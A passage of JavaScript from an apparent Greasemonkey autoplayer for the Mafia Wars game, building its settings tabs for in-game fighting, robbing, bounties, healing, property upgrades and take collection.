  title = 'Make the minimum mafia size be relative to your own. For example, if you have 300 mafia members, and minimum mafia is set to 50, opponents with less than 250 mafia members will be avoided.';
  id = 'fightMafiaMinRelative';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'fightMafiaMinRelative');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Subtract from my mafia size'));

  // Mob fight
  tabContainerDivs(staminaTabSub);
  title = 'Fight higher levels if the mafia is smaller.  You mob them, overwhelm the smaller numbers';
  id = 'fightMobMode';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'fightMobMode');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Mob Fight'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
  tabContainerDivs(staminaTabSub);

  // Pattern Fighting ?
  title = ' Use Mafia Family Patterns when fighting';
  id = 'fightNames';
  var UseFightNames = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Use Patterns when fighting:'));
  UseFightNames.addEventListener('click', clickUseFightNames, false);
  makeElement('br', lhs);
  id = 'fightAvoidNames';
  title = ' Avoid mafia families';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('br', lhs);
  id = 'fightOnlyNames';
  title = ' Only Fight Mafia Families ';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 6em;', 'id':'fightClanName', 'title':'Enter each pattern (such as a clan name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('fightClanName', defaultClans.join('\n'))));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Use stealth fighting?
  tabContainerDivs(staminaTabSub);
  title = 'Prefer opponents who won\'t be notified of your attacks.';
  id = 'fightStealth';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'fightStealth');
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Use fight stealth'));

  /*
  // Avoid Top Mafia bodyguards?
  title = 'Avoid opponents known to be Top Mafia bodyguards. This may ' +
          'decrease the frequency of losses due to critical hits.';
  id = 'fightAvoidBodyguards';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'vertical-align:middle', 'value':'checked'}, 'fightAvoidBodyguards', 'checked');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Avoid Top Mafia bodyguards'));
  */
}

function createStaminaSubTab_FightSpecific(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  makeElement('label', lhs).appendChild(document.createTextNode('Fight in: '));
  id = 'fightListLoc';
  var fightListLoc = makeElement('select', lhs, {'id':id});
  for (i = 0, iLength=fightLocations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(fightLocations[i]));
    fightListLoc.appendChild(choice);
  }
  fightListLoc.selectedIndex = GM_getValue('fightLocation', NY);

  //rehit on money gain
  title = 'Reattack until iced if money gained';
  id = 'staminaReattackList';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});
  label.appendChild(document.createTextNode('While gaining $ '));
  //Money gain treshold
  title = 'Reattack if this amount is gained';
  id = 'reattackThresholdList';
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'maxlength':6, 'style':'width: 45px; border: 1px solid #781351;', 'value':GM_getValue(id, '65000'), 'size':'1'});
  label = makeElement('label', rhs, {'for':id, 'title':title,'style':'margin-left: 0.5em;'});

  // IceCheck
  title = 'Attack ONLY live targets';
  id = 'iceCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'iceCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Skip iced targets'));

  //Replaces old stamina settings insert
  staminaBursting(staminaTabSub);

  // Opponent list
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Fight these opponents:'));
  makeElement('textarea', rhs, {'style':'position: static; width: 180px; height: 105px;', 'id':'fightList', 'title':'Enter each opponent\'s ID (not their name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('fightList', '')));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each Facebook ID on a separate line.'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
}

function createStaminaSubTab_FightRob(staminaTabSub) {
  createStaminaSubTab_Rob(staminaTabSub);
  makeElement('hr', staminaTabSub);
  createStaminaSubTab_FightRandom(staminaTabSub);
}

function createStaminaSubTab_Rob(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Rob in:'));
  id = 'robLocation';
  var robLocation = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    robLocation.appendChild(choice);
  }
  robLocation.selectedIndex = GM_getValue('robLocation', NY);

  // Fast Rob
  title = 'Fast rob, does not log';
  id = 'fastRob';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked', 'style': 'margin-left: 10px;'}, id);
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Fast Rob?'));

}

function createStaminaSubTab_CollectBounties(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Collect bounties in:'));
  id = 'hitmanLocation';
  var hitmanLoc = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    hitmanLoc.appendChild(choice);
  }
  hitmanLoc.selectedIndex = GM_getValue('hitmanLocation', NY);

  //Replaces old stamina settings insert
  staminaBursting(staminaTabSub);

  // Minimum bounty
  tabContainerDivs(staminaTabSub);
  id = 'hitmanBountyMin';
  title = 'Ignore targets with bounties below this measly amount.',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Minimum bounty:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 7em; border: 1px solid #781351;', 'value':GM_getValue('hitmanBountyMin', '0')});

  // Bounty selection
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Prefer targets with:'));
  id = 'bountySelection';
  var bountySelection = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=bountySelectionChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(bountySelectionChoices[i]));
    bountySelection.appendChild(choice);
  }
  bountySelection.selectedIndex = GM_getValue('bountySelection', BOUNTY_HIGHEST_BOUNTY);

  tabContainerDivs(staminaTabSub);

  // Pattern Fighting ?
  title = ' Use Mafia Family Patterns for collecting bounties';
  id = 'hitmanNames';
  var UseHitmanNames = makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(' Use Patterns when collecting:'));
  UseHitmanNames.addEventListener('click', clickUseHitmanNames, false);
  makeElement('br', lhs);
  id = 'hitmanAvoidNames';
  title = ' Avoid mafia families';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));
  makeElement('br', lhs);
  id = 'hitmanOnlyNames';
  title = ' Only Fight Mafia Families ';
  makeElement('input', lhs, {'type':'radio', 'name':'rm3', 'id':id, 'value':'checked'}, id);
  makeElement('label', lhs, {'for':id}).appendChild(document.createTextNode(title));

  makeElement('textarea', rhs, {'style':'position: static; width: 15em; height: 6em;', 'id':'hitmanClanName', 'title':'Enter each pattern (such as a clan name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('hitmanClanName', defaultClans.join('\n'))));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each name pattern on a separate line.'));

  // Remove stronger opponents?
  removeStrongerOpponents(staminaTabSub);
}

function createStaminaSubTab_SetBounties(staminaTabSub) {

  // Location setting
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Place bounties in:'));
  id = 'autoHitListLoc';
  var autoHitListLoc = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    autoHitListLoc.appendChild(choice);
  }
  autoHitListLoc.selectedIndex = GM_getValue('autoHitListLoc', NY);

  title = 'Set Bounties in background';
  id = 'bgAutoHitCheck';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'bgAutoHitCheck');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Enable Background mode'));

  // Bounty amount
  tabContainerDivs(staminaTabSub);
  id = 'autoHitListBounty';
  title = 'Place a fixed bounty or check random',
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Bounty:'));
  makeElement('input', rhs, {'type':'text', 'id':id, 'title':title, 'style':'width: 7em; border: 1px solid #781351;', 'value':GM_getValue('autoHitListBounty', '0')});

  title = 'Place Random Bounties';
  id = 'autoHitListRandom';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'autoHitListRandom');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' random'));

  // Opponent list
  tabContainerDivs(staminaTabSub);
  lhs.appendChild(document.createTextNode('Hitlist these opponents:'));
  makeElement('textarea', rhs, {'style':'position: static; width: 180px; height: 105px;', 'id':'autoHitOpponentList', 'title':'Enter each opponent\'s ID (not their name) on a separate line.'}).appendChild(document.createTextNode(GM_getValue('autoHitOpponentList', '')));
  makeElement('br', rhs);
  makeElement('font', rhs, {'style':'font-size: 10px;'}).appendChild(document.createTextNode('Enter each Facebook ID on a separate line.'));
}

function createStaminaSubTab_Random(staminaTabSub) {

  // Stamina Spend choice setting
  var SpendModes = GM_getValue('randomSpendModes');
  if(!SpendModes) SpendModes="1000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;'});
  item.appendChild(document.createTextNode('Stamina Spend Modes :'));
  makeElement('br', item);

  title ="Stamina Spend Choice selection";
  name = 'randomSpendModes[]';
  for (i = 0, iLength=randomSpendChoices.length; i < iLength; ++i) {
    if(SpendModes[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':randomSpendChoices[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':randomSpendChoices[i], 'checked':'checked'});
    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':randomSpendChoices[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':randomSpendChoices[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(randomSpendChoices[i]));
  }
  makeElement('br', item);

  // Location setting for Fighting
  var fightCities = GM_getValue('randomFightLocations');
  if(!fightCities) fightCities="10000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;margin-top:1em;'});
  item.appendChild(document.createTextNode('Location Settings :'));
  makeElement('br', item);
  item.appendChild(document.createTextNode('Fight in:'));
  makeElement('br', item);
  title ="Fighting cities selection";
  name = 'randomFightLocations[]';
  for (i = 0, iLength=randomLocations.length; i < iLength; ++i) {
    if(fightCities[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i], 'checked':'checked'});
    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(locations[i]));
  }
  makeElement('br', item);

  // Location setting for Robbing
  var robCities = GM_getValue('randomRobLocations');
  if(!robCities) robCities="10000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;'});
  item.appendChild(document.createTextNode('Rob in:'));
  makeElement('br', item);
  title ="Robbing cities selection";
  name = 'randomRobLocations[]';
  for (i = 0, iLength=randomLocations.length; i < iLength; ++i) {
    if(robCities[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i], 'checked':'checked'});
    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(locations[i]));
  }
  makeElement('br', item);

  // Location setting for Bounty Collection
  var hitCities = GM_getValue('randomHitmanLocations');
  if(!hitCities) hitCities="10000";
  var item = makeElement('div', staminaTabSub, {'style':'margin-left:0.5em;'});
  item.appendChild(document.createTextNode('Collect Bounties in:'));
  makeElement('br', item);
  title ="Hitman cities selection";
  name = 'randomHitmanLocations[]';
  for (i = 0, iLength=randomLocations.length; i < iLength; ++i) {
    if(hitCities[i]=='1')
      makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i], 'checked':'checked'});
    else makeElement('input', item, {'type':'checkbox', 'name':name, 'title':locations[i], 'style':'margin-left: 0.5em;margin-right: 0.5em;', 'value':locations[i]});
    label = makeElement('label', item, {'for':name, 'title':title});
    label.appendChild(document.createTextNode(locations[i]));
  }
  makeElement('br', item,{'style':'margin-bottom:0.5em;'});

}

// Create New Stamina Tab
function createStaminaTab() {
  var i, elt, title, id, label, lhs, item, choice;
  var staminaTab = makeElement('div', null, {'id':'staminaTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  // Container for a list of settings.
  var list = makeElement('div', staminaTab, {'style':'position: relative; top: 5px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  //
  // How to spend stamina (fight/hitlist).
  //
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});

  title = 'Spend stamina automatically.';
  id = 'staminaSpend';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'staminaSpend');
  label = makeElement('label', lhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Spend stamina to:'));

  id = 'staminaSpendHow';
  var staminaSpendHow = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=staminaSpendChoices.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(staminaSpendChoices[i]));
    staminaSpendHow.appendChild(choice);
  }

  // Stamina noDelay
  title = 'No delay interval between actions';
  id = 'staminaNoDelay';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'style':'margin-left: 0.5em;', 'value':'checked'}, 'staminaNoDelay');
  label = makeElement('label', rhs, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' No delay'));

  // Subtab for staminaSpendHow specific settings
  var staminaTabSub = makeElement('div', list, {'id':'staminaTabSub', 'style':'position: static; border: 1px inset #FFD927; margin-left: auto; margin-right: auto; margin-top: 5px; margin-bottom: 5px;'});

  // Spend stamina option
  item = makeElement('div', list, {'class':'single'});
  title = 'Start spending stamina when stamina level is reached';
  id = 'selectStaminaUse';
  item.appendChild(document.createTextNode('Start spending stamina when '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectStaminaUseMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' of stamina has accumulated.'));

  // Stamina to reserve for manual play
  item = makeElement('div', list, {'class':'single'});
  title = 'Suspend automatic play below this level of stamina.';
  id = 'selectStaminaKeep';
  item.appendChild(document.createTextNode('Reserve '));
  makeElement('input', item, {'type':'text', 'id':id, 'title':title, 'style':'width: 2em; ', 'value':GM_getValue(id, '0')});
  id = 'selectStaminaKeepMode';
  item.appendChild(document.createTextNode(' '));
  elt = makeElement('select', item, {'id':id, 'title':title});
  for (i = 0, iLength = numberSchemes.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(numberSchemes[i]));
    elt.appendChild(choice);
  }
  elt.selectedIndex = GM_getValue(id, 0);
  item.appendChild(document.createTextNode(' of stamina for manual play.'));

  // Level up
  item = makeElement('div', list, {'class':'single'});
  title = 'Ignore minimum stamina settings if a level up is within reach.';
  id = 'allowStaminaToLevelUp';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, 'allowStaminaToLevelUp');
  label = makeElement('label', item, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Don\'t reserve stamina if within reach of the next level.'));

  // Handler for switching sub-areas.
  var handleSpendChanged = function() {
    staminaTabSub.innerHTML = '';
    // Create the appropriate SubTab
    var i = staminaSpendHow.selectedIndex;
    switch(i){
      case STAMINA_HOW_FIGHT_RANDOM :
        createStaminaSubTab_FightRandom(staminaTabSub);
        break;
      case STAMINA_HOW_FIGHT_LIST :
        createStaminaSubTab_FightSpecific(staminaTabSub);
        break;
      case STAMINA_HOW_HITMAN :
        createStaminaSubTab_CollectBounties(staminaTabSub);
        break;
      case STAMINA_HOW_ROBBING :
        createStaminaSubTab_Rob(staminaTabSub);
        break;
      case STAMINA_HOW_AUTOHITLIST :
        createStaminaSubTab_SetBounties(staminaTabSub);
        break;
      case STAMINA_HOW_RANDOM :
        createStaminaSubTab_Random(staminaTabSub);
        break;
      case STAMINA_HOW_FIGHTROB :
        createStaminaSubTab_FightRob(staminaTabSub);
        break;
      default :
        createStaminaSubTab_Random(staminaTabSub);
        break;
    }
  }

  staminaSpendHow.selectedIndex = GM_getValue('staminaSpendHow', 0);
  handleSpendChanged();
  staminaSpendHow.addEventListener('change', handleSpendChanged, false);

  return staminaTab;
}

// Create Heal Tab
function createHealTab() {
  var elt, title, id, label, item, lhs, rhs, i, choice;
  var healTab = makeElement('div', null, {'id':'healTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  // Container for a list of settings.
  var list = makeElement('div', healTab, {'style':'position: relative; top: 10px; margin-left: auto; margin-right: auto; width: 95%; line-height:120%;'});

  // Healing options
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Heal when health lands below indicated health.';
  id = 'autoHeal';
  makeElement('input', lhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id, 'checked');
  makeElement('img', lhs, {'style':'padding-left: 5px;','src':stripURI(healthIcon)});
  makeElement('label', lhs, {'for':id, 'title':title}).appendChild(document.createTextNode(' Heal in:'));
  id = 'healLocation';
  var healLocation = makeElement('select', rhs, {'id':id});
  for (i = 0, iLength=locations.length; i < iLength; ++i) {
    choice = document.createElement('option');
    choice.value = i;
    choice.appendChild(document.createTextNode(locations[i]));
    healLocation.appendChild(choice);
  }

  healLocation.selectedIndex = GM_getValue('healLocation', NY);
  makeElement('label', rhs, {'title':title}).appendChild(document.createTextNode(' when health falls below '));
  makeElement('input', rhs, {'style':'text-align: center','type':'text', 'value':GM_getValue('healthLevel', '50'), 'id':'healthLevel', 'size':'1'});
  makeElement('label', rhs, {'title':title}).appendChild(document.createTextNode(' points'));

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  // Use quickHeal() instead of autoHeal()
  title = 'Check for PS MWAP to use quickheal';
  id = 'quickHeal';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('img', rhs, {'style':'padding-left: 5px;','src':stripURI(healthIcon)});
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Use quickheal'));

  // Attack at critical health
  makeElement('br', rhs, {'class':'hide'});
  title = 'Check to attack even when at critical health (21-28 health points) ';
  id = 'attackCritical';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'title':title, 'value':'checked'}, id);
  makeElement('img', rhs, {'style':'padding-left: 5px;','src':stripURI(attackIcon)});
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Attack at critical health'));

  // Hide in hospital
  makeElement('br', rhs, {'class':'hide'});
  title = 'Hide in hospital ';
  id = 'hideInHospital';
  var hideInHosp = makeElement('input', rhs, {'type':'checkbox', 'title':title, 'id':id, 'value':'checked'}, id);
  makeElement('img', rhs, {'style':'padding-left: 5px;','src':stripURI(hideIcon)});
  title = hideInHosp.checked ? ' Hide in hospital but...' : ' Hide in hospital';
  makeElement('label', rhs, {'id':'hideLabel', 'for':id, 'title':title}).appendChild(document.createTextNode(title));

  elt = makeElement('div', rhs, {'style':'position: relative; line-height: 150%; left: 17px;','id':'hideOpts'});
  for (i = 0, iLength=healOptions.length; i < iLength; i++) {
//    for (i = 0, iLength=2; i < iLength; i++) {
    id = healOptions[i][0];
    title = healOptions[i][1];
    var info = healOptions[i][2];
    var optElt = makeElement('div', elt);
    makeElement('input', optElt, {'type':'checkbox', 'id':id, 'title':info, 'value':'checked'}, id);
    label = makeElement('label', optElt, {'for':id, 'title':info});
    label.appendChild(document.createTextNode(' ' + title));
  }
  elt.style.display = hideInHosp.checked ? '' : 'none';

  var hideHandler = function() {
    var hideOpts = document.getElementById('hideOpts');
    var hideLabel = document.getElementById('hideLabel');
    if (!hideOpts) return false;
    if (this.checked) {
      hideOpts.style.display = '';
      hideLabel.firstChild.nodeValue = ' Hide in hospital but...';
    } else {
      hideOpts.style.display = 'none';
      hideLabel.firstChild.nodeValue = ' Hide in hospital';
    }
    return true;
  };
  hideInHosp.addEventListener('click', hideHandler, false);

 // block healing while robbing
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  id = 'BlockHealRobbing';
  title = 'block auto heal while in ROB RANDOM OPPONENTS mode';
  makeElement('input', item, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', item, {'for':id,'title':title}).appendChild(document.createTextNode(' block auto heal while robbing'));

  // stamina minimum to allow healing
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  title = 'Set the minimum Stamina Points Needed for Auto-Heal.';
  label = makeElement('label', lhs, {'title':title});
  label.appendChild(document.createTextNode('Disable Auto-Heal when Stamina falls below:'));
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue('stamina_min_heal', '22'), 'id':'stamina_min_heal', 'size':'3', 'style':'text-align: center'});
  rhs.appendChild(document.createTextNode(' points'));

  // Hitlist riding
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'hideAttacks';
  title = 'Enable hitlist riding: PS MWAP disables autoHeal after you got XP from attacks; it enables it again after parsing a snuffed message.';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Hitlist riding, turn off autoHeal after '));
  id = 'rideHitlistXP';
  title = 'Enter the XP you want to gain before PS MWAP turns off autoHeal. Enter \'0\' if you want PS MWAP to turn off autoHeal after it detected a 0 xp attack.';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'style':'width: 25px'});
  rhs.appendChild(document.createTextNode(' xp'));

  // Health reserve
  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'stopPA';
  title = 'do not use Powerattack when health is below treshold';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Do not use Power Attack when health falls below  '));
  id = 'stopPAHealth';
  title = 'Enter min health level';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'style':'width: 25px'});

  item = makeElement('div', list);
  lhs = makeElement('div', item, {'class':'lhs'});
  rhs = makeElement('div', item, {'class':'rhs'});
  makeElement('br', item, {'class':'hide'});
  id = 'stopBursts';
  title = 'do not use Bursts when health is below treshold';
  makeElement('input', rhs, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  makeElement('label', rhs, {'for':id,'title':title}).appendChild(document.createTextNode(' Do not use Bursts when health falls below  '));
  id = 'stopBurstsHealth';
  title = 'Enter min health level';
  makeElement('input', rhs, {'type':'text', 'value':GM_getValue(id, '0'), 'title':title, 'id':id, 'style':'width: 25px'});

  return healTab;

}

// Create Cash tab
function createCashTab () {
  var elt, title, id, label;
  var cashTab = makeElement('div', null, {'id':'cashTab', 'class':'tabcontent', 'style':'background-image:url(' + stripURI(bgTabImage) + ')'});

  title = 'Check this to auto-upgrade properties';
  id = 'autoBuy';
  var autoBuy = makeElement('div', cashTab, {'style':'top: 10px;'});
  makeElement('input', autoBuy, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', autoBuy, {'for':id, 'title':title});
  label.appendChild(document.createTextNode(' Auto-upgrade properties '));

  var xTop = 35;
  for (var i = 0, iLength = cities.length; i < iLength; ++i) {
    // Skip autoupgrade properties for Las Vegas
    if (i == LV) continue;
    title = 'Never spend below this amount of cash ('+cities[i][CITY_NAME]+')';
    id = 'minCash' + cities[i][CITY_NAME];
    var minCash = makeElement('div', cashTab, {'style':'top: '+xTop+'px; left: 10px; width: 250px;'});
    minCash.appendChild(document.createTextNode('Minimum cash ('+cities[i][CITY_NAME]+'): '));
    makeElement('input', minCash, {'type':'text', 'style':'position: absolute; right: 5px; width: 80px; text-align: right;', 'title':title, 'value':GM_getValue(id, '0'), 'id':id, 'size':'5'});
    xTop += 25;
  }

  // Option to build a car
  xTop += 25;
  title = 'Check this to build a car every 24 hours';
  id = 'buildCar';
  var buildCar = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildCar, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildCar, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Car'));

  // Car list
  id = 'buildCarId';
  var carType = makeElement('select', buildCar, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityCars.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityCars[i][2]});
    choice.appendChild(document.createTextNode(cityCars[i][0]));
    carType.appendChild(choice);
  }
  carType.selectedIndex = GM_getValue(id, 8);
  carType.setAttribute('title', cityCars[carType.selectedIndex][2]);

  // Option to build a weapon
  xTop += 25;
  title = 'Check this to build a weapon every 24 hours';
  id = 'buildWeapon';
  var buildWeapon = makeElement('div', cashTab, {'style':'top: '+xTop+'px;'});
  makeElement('input', buildWeapon, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
  label = makeElement('label', buildWeapon, {'for':id, 'title':title});
  label.appendChild(document.createTextNode('Build Weapon'));

  // Weapon list
  id = 'buildWeaponId';
  var weaponType = makeElement('select', buildWeapon, {'id':id, 'style':'position: static; margin-left: 5px;'});
  for (i = 0, iLength=cityWeapons.length; i < iLength; ++i) {
    var choice = makeElement('option', null, {'value':i,'title':cityWeapons[i][2]});
    choice.appendChild(document.createTextNode(cityWeapons[i][0]));
    weaponType.appendChild(choice);
  }
  weaponType.selectedIndex = GM_getValue(id, 7);
  weaponType.setAttribute('title', cityWeapons[weaponType.selectedIndex][2]);

  // Collect Takes
  var xTop = 50;
  for (var i = 0, iLength = cities.length; i < iLength; ++i) {
    title = 'Automatically collect ' + cities[i][CITY_NAME] + ' take';
    id = 'collectTake' + cities[i][CITY_NAME];
    var autoTake = makeElement('div', cashTab, {'style':'top: '+xTop+'px; right: 10px;'});
    label = makeElement('label', autoTake, {'for':id, 'title':title});
    label.appendChild(document.createTextNode('Collect ' + cities[i][CITY_NAME] + ' take'));
    makeElement('input', autoTake, {'type':'checkbox', 'id':id, 'value':'checked'}, id);
    xTop += 25;
  }

  // Autobanking
  var xTop = 220;
